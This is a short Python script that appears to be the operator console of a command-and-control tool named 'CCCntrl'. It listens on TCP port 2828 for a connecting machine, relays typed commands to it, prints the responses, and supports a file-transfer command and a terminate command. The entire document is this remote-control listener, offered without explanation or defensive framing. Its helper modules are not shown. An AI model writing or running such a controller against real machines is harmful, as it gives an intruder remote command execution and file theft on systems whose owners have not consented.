#! /usr/bin/env python3

import socket, modules
import modules.socketnoise as socketnoise


host = '192.168.0.16'
port = 2828
instruction = ''

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(
		'[CCCntrl] Listening for incoming TCP connection on port ' + str(port)
	)
    conn, addr = s.accept()
    print(
		'[CCCntrl] We got a connection from: ' + str(addr)
	)



    while True: 
        command = input("CCCtrl > ")
        if command == "==terminate":
            socketnoise.respond(s, '==terminate')
            s.close() 
            break
        elif '==transfer' in command: 
            modules.transfer(conn,command)
        else:
            response = socketnoise.ask(conn, command)
            if '[ERROR]' in response:
                print('ouch, an error!')
            print(str(response))


connect()